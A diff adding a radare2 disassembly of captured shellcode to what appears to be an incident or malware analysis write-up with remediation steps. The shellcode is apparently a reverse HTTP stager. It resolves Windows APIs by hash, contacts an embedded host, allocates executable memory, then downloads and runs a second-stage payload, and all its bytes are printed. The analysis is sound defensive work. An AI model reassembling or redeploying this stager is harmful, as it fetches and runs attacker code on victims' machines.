@@ -195,3 +195,209 @@ This is likely due to a different payload creation with "HttpUserAgent=", as I u
 3. Block 172.26.201.217 in the firewall.
 4. Locate the source of the powershell and clean the device (maldoc, etc).
 
+Raw dump with radare2:
+
+```
+0x00000000   1                       fc  cld
+0x00000001   5               e882000000  call 0x88
+0x00000006   1                       60  pushad
+0x00000007   2                     89e5  mov ebp, esp
+0x00000009   2                     31c0  xor eax, eax
+0x0000000b   4                 648b5030  mov edx, [fs:eax+0x30]
+0x0000000f   3                   8b520c  mov edx, [edx+0xc]
+0x00000012   3                   8b5214  mov edx, [edx+0x14]
+0x00000015   3                   8b7228  mov esi, [edx+0x28]
+0x00000018   4                 0fb74a26  movzx ecx, word [edx+0x26]
+0x0000001c   2                     31ff  xor edi, edi
+0x0000001e   1                       ac  lodsb
+0x0000001f   2                     3c61  cmp al, 0x61
+0x00000021   2                     7c02  jl 0x25
+0x00000023   2                     2c20  sub al, 0x20
+0x00000025   3                   c1cf0d  ror edi, 0xd
+0x00000028   2                     01c7  add edi, eax
+0x0000002a   2                     e2f2  loop 0x10000001e
+0x0000002c   1                       52  push edx
+0x0000002d   1                       57  push edi
+0x0000002e   3                   8b5210  mov edx, [edx+0x10]
+0x00000031   3                   8b4a3c  mov ecx, [edx+0x3c]
+0x00000034   4                 8b4c1178  mov ecx, [ecx+edx+0x78]
+0x00000038   2                     e348  jecxz 0x82
+0x0000003a   2                     01d1  add ecx, edx
+0x0000003c   1                       51  push ecx
+0x0000003d   3                   8b5920  mov ebx, [ecx+0x20]
+0x00000040   2                     01d3  add ebx, edx
+0x00000042   3                   8b4918  mov ecx, [ecx+0x18]
+0x00000045   2                     e33a  jecxz 0x81
+0x00000047   1                       49  dec ecx
+0x00000048   3                   8b348b  mov esi, [ebx+ecx*4]
+0x0000004b   2                     01d6  add esi, edx
+0x0000004d   2                     31ff  xor edi, edi
+0x0000004f   1                       ac  lodsb
+0x00000050   3                   c1cf0d  ror edi, 0xd
+0x00000053   2                     01c7  add edi, eax
+0x00000055   2                     38e0  cmp al, ah
+0x00000057   2                     75f6  jnz 0x10000004f
+0x00000059   3                   037df8  add edi, [ebp-0x8]
+0x0000005c   3                   3b7d24  cmp edi, [ebp+0x24]
+0x0000005f   2                     75e4  jnz 0x100000045
+0x00000061   1                       58  pop eax
+0x00000062   3                   8b5824  mov ebx, [eax+0x24]
+0x00000065   2                     01d3  add ebx, edx
+0x00000067   4                 668b0c4b  mov cx, [ebx+ecx*2]
+0x0000006b   3                   8b581c  mov ebx, [eax+0x1c]
+0x0000006e   2                     01d3  add ebx, edx
+0x00000070   3                   8b048b  mov eax, [ebx+ecx*4]
+0x00000073   2                     01d0  add eax, edx
+0x00000075   4                 89442424  mov [esp+0x24], eax
+0x00000079   1                       5b  pop ebx
+0x0000007a   1                       5b  pop ebx
+0x0000007b   1                       61  popad
+0x0000007c   1                       59  pop ecx
+0x0000007d   1                       5a  pop edx
+0x0000007e   1                       51  push ecx
+0x0000007f   2                     ffe0  jmp eax
+0x00000081   1                       5f  pop edi
+0x00000082   1                       5f  pop edi
+0x00000083   1                       5a  pop edx
+0x00000084   2                     8b12  mov edx, [edx]
+0x00000086   2                     eb8d  jmp 0x100000015
+0x00000088   1                       5d  pop ebp
+0x00000089   5               686e657400  push 0x74656e
+0x0000008e   5               6877696e69  push 0x696e6977 ; wininet,0
+0x00000093   1                       54  push esp
+0x00000094   5               684c772607  push 0x726774c ; hash("kernel32.dll","LoadLibraryA")
+0x00000099   2                     ffd5  call ebp
+0x0000009b   2                     31db  xor ebx, ebx
+0x0000009d   1                       53  push ebx
+0x0000009e   1                       53  push ebx
+0x0000009f   1                       53  push ebx
+0x000000a0   1                       53  push ebx
+0x000000a1   1                       53  push ebx
+0x000000a2   5               683a5679a7  push 0xa779563a ; hash("wininet.dll","InternetOpenA")
+0x000000a7   2                     ffd5  call ebp
+0x000000a9   1                       53  push ebx
+0x000000aa   1                       53  push ebx
+0x000000ab   2                     6a03  push 0x3
+0x000000ad   1                       53  push ebx
+0x000000ae   1                       53  push ebx
+0x000000af   5               68525a0000  push 0x5a52
+0x000000b4   5               e8dd000000  call 0x196
+0x000000b9   1                       2f  das
+0x000000ba   1                       4c  dec esp
+0x000000bb   1                       57  push edi
+0x000000bc   3                   624e2d  bound ecx, [esi+0x2d]
+0x000000bf   1                       5a  pop edx
+0x000000c0   2                     7a46  jp 0x108
+0x000000c2   1                       53  push ebx
+0x000000c3   1                       4d  dec ebp
+0x000000c4   2                     734d  jae 0x113
+0x000000c6   1                       59  pop ecx
+0x000000c7   4                 67316a56  xor [bp+si+0x56], ebp
+0x000000cb   2                     674a  a16 dec edx
+0x000000cd   2                     6648  dec ax
+0x000000cf   2                     674f  a16 dec edi
+0x000000d1   1                       4f  dec edi
+0x000000d2   3                   657232  jb 0x107
+0x000000d5   1                       54  push esp
+0x000000d6   4                 62546146  bound edx, [ecx+0x46]
+0x000000da   1                       37  aaa
+0x000000db   1                       55  push ebp
+0x000000dc   2                     7962  jns 0x140
+0x000000de   1                       57  push edi
+0x000000df   2                     7058  jo 0x139
+0x000000e1   1                       5a  pop edx
+0x000000e2   1                       5a  pop edx
+0x000000e3   1                       4e  dec esi
+0x000000e4   5               2d6444556c  sub eax, 0x6c554464
+0x000000e9   3                   64754b  jnz 0x137
+0x000000ec   1                       52  push edx
+0x000000ed   2                     7275  jb 0x164
+0x000000ef   2                     7a6e  jp 0x15f
+0x000000f1   2                     3468  xor al, 0x68
+0x000000f3   1                       41  inc ecx
+0x000000f4   1                       47  inc edi
+0x000000f5   1                       58  pop eax
+0x000000f6   2                     7548  jnz 0x140
+0x000000f8   1                       6f  outsd
+0x000000f9   6             6535356f4850  xor eax, 0x50486f35
+0x000000ff   2                     7738  ja 0x139
+0x00000101   1                       44  inc esp
+0x00000102   8         69547a6261635733  imul edx, [edx+edi*2+0x62], 0x33576361
+0x0000010a   1                       55  push ebp
+0x0000010b   5               2d655a6a62  sub eax, 0x626a5a65
+0x00000110   5               6863005068  push 0x68500063
+0x00000115   1                       57  push edi
+0x00000116   6             899fc6ffd589  mov [edi-0x762a003a], ebx
+0x0000011c   1                       c6  invalid
+0x0000011d   1                       53  push ebx
+0x0000011e   5               680032e084  push 0x84e03200 ; hash("wininet.dll", "HttpOpenRequestA”)
+0x00000123   1                       53  push ebx
+0x00000124   1                       53  push ebx
+0x00000125   1                       53  push ebx
+0x00000126   1                       57  push edi
+0x00000127   1                       53  push ebx
+0x00000128   1                       56  push esi
+0x00000129   5               68eb552e3b  push 0x3b2e55eb ; hash("wininet.dll","HttpOpenRequestA")
+0x0000012e   2                     ffd5  call ebp
+0x00000130   1                       96  xchg esi, eax
+0x00000131   2                     6a0a  push 0xa
+0x00000133   1                       5f  pop edi
+0x00000134   5               6880330000  push 0x3380
+0x00000139   2                     89e0  mov eax, esp
+0x0000013b   2                     6a04  push 0x4
+0x0000013d   1                       50  push eax
+0x0000013e   2                     6a1f  push 0x1f
+0x00000140   1                       56  push esi
+0x00000141   5               6875469e86  push 0x869e4675 ; hash("wininet.dll", "InternetSetOptionA”)
+0x00000146   2                     ffd5  call ebp
+0x00000148   1                       53  push ebx
+0x00000149   1                       53  push ebx
+0x0000014a   1                       53  push ebx
+0x0000014b   1                       53  push ebx
+0x0000014c   1                       56  push esi
+0x0000014d   5               682d06187b  push 0x7b18062d ; hash("wininet.dll","HttpSendRequestA")
+0x00000152   2                     ffd5  call ebp
+0x00000154   2                     85c0  test eax, eax
+0x00000156   2                     7508  jnz 0x160
+0x00000158   1                       4f  dec edi
+0x00000159   2                     75d9  jnz 0x100000134
+0x0000015b   5               e852000000  call 0x1b2
+0x00000160   2                     6a40  push 0x40
+0x00000162   5               6800100000  push 0x1000
+0x00000167   5               6800004000  push 0x400000
+0x0000016c   1                       53  push ebx
+0x0000016d   5               6858a453e5  push 0xe553a458 ; hash("kernel32.dll","VirtualAlloc")
+0x00000172   2                     ffd5  call ebp
+0x00000174   1                       93  xchg ebx, eax
+0x00000175   1                       53  push ebx
+0x00000176   1                       53  push ebx
+0x00000177   2                     89e7  mov edi, esp
+0x00000179   1                       57  push edi
+0x0000017a   5               6800200000  push 0x2000
+0x0000017f   1                       53  push ebx
+0x00000180   1                       56  push esi
+0x00000181   5               68129689e2  push 0xe2899612  ; hash("wininet.dll","InternetReadFile")
+0x00000186   2                     ffd5  call ebp
+0x00000188   2                     85c0  test eax, eax
+0x0000018a   2                     74cf  jz 0x10000015b
+0x0000018c   2                     8b07  mov eax, [edi]
+0x0000018e   2                     01c3  add ebx, eax
+0x00000190   2                     85c0  test eax, eax
+0x00000192   2                     75e5  jnz 0x100000179
+0x00000194   1                       58  pop eax
+0x00000195   1                       c3  ret
+0x00000196   1                       5f  pop edi
+0x00000197   5               e877ffffff  call 0x100000113
+0x0000019c   2                     7961  jns 0x1ff
+0x0000019e   3                   626164  bound esp, [ecx+0x64]
+0x000001a1   1                       61  popad
+0x000001a2   3                   626131  bound esp, [ecx+0x31]
+0x000001a5   2                     3131  xor [ecx], esi
+0x000001a7   6             2e686f70746f  push 0x6f74706f
+0x000001ad   2                     2e6f  cs outsd
+0x000001af   2                     7267  jb 0x218
+0x000001b1   6             00bbf0b5a256  add [ebx+0x56a2b5f0], bh
+0x000001b7   2                     6a00  push 0x0
+0x000001b9   1                       53  push ebx
+0x000001ba   2                     ffd5  call ebp
+```
